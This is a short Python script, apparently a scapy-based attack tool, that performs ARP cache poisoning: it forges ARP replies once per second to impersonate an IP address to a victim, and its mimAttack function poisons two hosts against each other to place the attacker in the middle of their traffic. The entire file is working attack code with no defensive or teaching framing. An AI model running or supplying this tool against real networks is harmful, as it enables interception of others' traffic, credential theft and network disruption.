from scapy.all import *
import time
from netifaces import ifaddresses,AF_LINK 

def ellapsed_time(st):
    et = time.time() - st
    return et

def arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof,interface):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker
    arp[ARP].psrc = ipToSpoof
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim

    sendp(arp, iface = interface)
    
def mac_self(interface):
    #mac = get_mac()
    #mac = '%012x' % mac
    #t = iter(mac)
    #mac = ':'.join(a+b for a,b in zip(t, t))
    #return mac
    return ifaddresses(interface)[AF_LINK][0]['addr']
    
def oneWayPoisoning(interface, ipVictim, ipToSpoof):
    
    if(interface == None):
        interface = str(conf.iface)
    #else:
        #interface = raw_input("Interface?:\n>>>")
        
    #ipAttacker = raw_input("Attacker IP address:\n>>>")
    #ipAttacker = get_if_addr(interface)
    macAttacker = mac_self(interface)
    
    #macVictim = raw_input("Victim MAC address:\n>>>")    
    #ipVictim = raw_input("Victim IP address:\n>>>")
    macVictim = getmacbyip(ipVictim)
        

    #ipToSpoof = raw_input("IP address to impersonate:\n>>>")
        
    start_time = time.time()
    
    print("\n\ninputs successful\n\n")    
        
    while (interface and ipVictim and ipToSpoof):
        
        try:
            if (ellapsed_time(start_time) > 1):
                arpPoison(macAttacker, macVictim, ipVictim, ipToSpoof,interface)
                start_time = time.time()
        
        except KeyboardInterrupt:
            return
    
def mimAttack(interface, ipVictim1, ipVictim2):
    
    if(interface == None):
        interface = str(conf.iface)
    #else:
        #interface = raw_input("Interface?:\n>>>")
    
    #ipAttacker = raw_input("Attacker IP address:\n>>>")
    #ipAttacker = get_if_addr(interface)
    macAttacker = mac_self(interface)

    #macVictim1 = raw_input("Victim 1 MAC address:\n>>>")
    #ipVictim1 = raw_input("Victim 1 IP address:\n>>>")
    macVictim1 = getmacbyip(ipVictim1)
        
    #macVictim2 = raw_input("Victim 2 MAC address:\n>>>")
    #ipVictim2 = raw_input("Victim 2 IP address:\n>>>")
    macVictim2 = getmacbyip(ipVictim2)
    
    start_time = time.time()
    
    while (interface and ipVictim1 and ipVictim2):
        
        try:
            if (ellapsed_time(start_time) > 1):
                arpPoison(macAttacker, macVictim1, ipVictim1, ipVictim2,interface)
                arpPoison(macAttacker, macVictim2, ipVictim2, ipVictim1,interface)
                start_time = time.time()
        
        except KeyboardInterrupt:
            return
